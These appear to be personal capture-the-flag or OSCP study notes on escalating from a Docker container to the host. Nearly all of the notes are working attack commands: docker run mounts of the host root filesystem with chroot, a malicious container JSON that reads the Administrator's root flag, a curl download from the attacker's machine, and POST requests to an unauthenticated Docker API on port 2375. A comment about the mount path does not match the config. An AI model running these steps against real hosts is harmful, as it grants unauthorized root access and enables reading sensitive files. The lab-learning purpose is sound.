Docker Port 2375

Check if part of docker group
```
id
```

```powershell
eleanor@peppo:~$ id  
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),999(docker)
```

Check if part of docker group
```  
groups
```

---

That 172.18.x.x IP range with a gateway at 172.18.0.1 screamed **Docker bridge network**. We’re not on the host — we’re trapped in a container.

```
cat /etc/resolv.conf
```

---

Confirmation of docker

if groups = docker or if docker missing

```
which docker
```

```
docker --version
```

---

check docker location

```
ls -l /var/run/docker.sock
```

---

try docker ps

```
docker ps
```

or

```
docker ps -a
```

---

if docker ps works = root

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

or

```
docker images
```

```
docker run -v /:/mnt --rm -it <IMAGE_NAME> chroot /mnt sh
```

if first cmd fails

```
docker run -v /:/mnt --rm alpine chroot /mnt sh
```

```
docker run -v /:/mnt --rm alpine /bin/sh -c "chroot /mnt sh"
```

Test API Endpoint
```
curl http://{ip from resolve.conf}:2375/images/json
```

---

## Malicious Container Strategy

The plan: Create a new container that mounts the host’s filesystem, then read the root flag directly from the Administrator’s desktop.

Created a container configuration file (`container.json`):

```python
{
  "Image": "alpine:latest",
  "Cmd": [
    "/bin/sh",
    "-c",
    "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"
  ],
  "HostConfig": {
    "Binds": [
      "/mnt/host/c:/mnt/host_root"
    ]
  },
  "Tty": true,
  "OpenStdin": true
}
```

This configuration:

1. Uses the lightweight Alpine image
2. Mounts the entire host filesystem to `/host` inside the container
3. Executes a command to read the root flag

Hosted the file on my attacking machine:

```
python3 -m http.server 7777
```

Downloaded it inside the compromised container:
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `curl http://${KaliIP}:7777/container.json -o /tmp/container.json`;

dv.paragraph("```bash\n" + command + "\n```");
```
## Container Creation & Execution

Sent a POST request to create the malicious container:

```
curl -X POST -H "Content-Type: application/json" -d @/tmp/container.json http://[ip from resolve.conf]:2375/containers/create?name=netanix
```

Started the container

```
curl -X POST http://[ip from resolve.conf]:2375/containers/[container hash response]/start
```

Root flag extraction
```
curl http://[ip from resolve.conf]:2375/containers/[container hash response]/logs?stdout=true
```
